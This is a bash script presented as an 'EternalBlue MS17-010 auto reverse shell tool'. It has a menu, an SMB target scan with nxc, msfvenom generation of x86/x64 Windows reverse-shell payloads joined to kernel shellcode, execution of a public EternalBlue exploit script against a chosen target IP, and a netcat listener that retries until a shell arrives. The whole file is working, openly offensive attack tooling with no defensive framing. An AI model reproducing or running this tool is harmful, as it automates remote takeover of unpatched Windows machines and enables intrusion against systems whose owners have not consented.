#!/bin/bash

#colors
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
cyan="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

trap ctrl_c INT
function ctrl_c(){
    echo -e "\n${red}[!] Terminating...${end}"
    exit 1
}

function banner(){
  echo -e "${blue}
            ⠀⠀⠀⣤⣴⣾⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄
            ⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢰⣦⣄⣀⣀⣠⣴⣾⣿⠃
            ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠀
            ⠀⠀⣼⣿⡿⠿⠛⠻⠿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
            ⠀⠀⠉⠀⠀⠀⢀⠀⠀⠀⠈⠁⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
            ⠀⠀⣠⣴⣶⣿⣿⣿⣷⣶⣤⠀⠀⠀⠈⠉⠛⠛⠛⠉⠉⠀⠀⠀
            ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣦⣄⣀⣀⣀⣤⣤⣶⠀⠀
            ⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
            ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
            ⢠⣿⡿⠿⠛⠉⠉⠉⠛⠿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
            ⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠿⠛⠀⠀⠀

  EternalBlue MS17-010 auto reverse shell tool
  ============================================

${end}"
}

function main_menu(){
  echo -e "${blue}Choose an option"
  echo -e "${blue}[1]${gray} Get Target information"
  echo -e "${blue}[2]${gray} Run exploit"
  echo -e "${blue}[0]${red} Exit"
  echo -ne "${blue}[>] ${yellow}" ; read menu_option
  if [[ $menu_option = "1" ]]; then 
    get_host_info
  elif [[ $menu_option = "2" ]]; then
    run_exploit
  else
    exit 1
  fi
}


function exploit_menu(){
  echo -ne "${yellow}[?]${gray} Target IP: ${yellow}";read  RHOST
  echo -ne "${yellow}[?]${gray} Your IP: ${yellow}";read LHOST
  echo -ne "${yellow}[?]${gray} Your Port: ${yellow}";read LPORT
  echo -e "${yellow}[?] Architecture of the host"
  echo -e "\t${purple}[1]${gray} x86"
  echo -e "\t${purple}[2]${gray} x64"
  echo -ne "${cyan}[>]${purple} ";read ARCH
}

function payload(){
  if [ $ARCH = "1" ]; then
    echo -e "${green}[+]${gray} Creating payload for ${red}x86:${blue} msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT${reset}"
    msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT 2>/dev/null
    FILE="x86.bin"
    cat ./sc_x86_kernel.bin ./sc_x86_msf.bin > $FILE
 

  elif [ $ARCH = "2" ]; then
    echo -e "${green}[+]${gray} Creating payload for ${red}x64:${blue} msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT${reset}"
    msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT
    FILE="x64.bin"
    cat ./sc_x64_kernel.bin ./sc_x64_msf.bin > $FILE
 
  else
    echo "${red}[!] Invalid Choice${reset}"
  fi
}

function exploit(){
  echo -e "${blue}"
  python 42031-eternal-blue.py $RHOST $FILE
  echo -e "${end}"
}


function shell(){
  nc -lnvp $LPORT -w 5 && reset=false|| reset=true && echo -e "${yellow}[!] Retrying...\nIf the issue persists is probably that the target machine got rebooted${end}"
}

function run(){
  exploit > /dev/null 2>&1 &
  shell
}


function run_exploit(){
  exploit_menu
  payload
  exploit & 
  shell

  while true; do
    exploit > /dev/null 2>&1 & 
    if [ "$reset" = "true" ];then
      run
    else
      break
    fi
  done
}

function get_host_info(){
  echo -ne "${blue}[?]${cyan} IP of the target: ${yellow}"; read RHOST
  ./nxc smb $RHOST 2>/dev/null
  echo -e "${yellow}[?]${gray} Would you like to go back?"
  echo -ne "${blue}[Y/n] "; read ans
  if [[ "$ans" == "Y" || "$ans" == "y" ]]; then
    main_menu
  else
    exit 1
  fi
}

clear
banner
main_menu


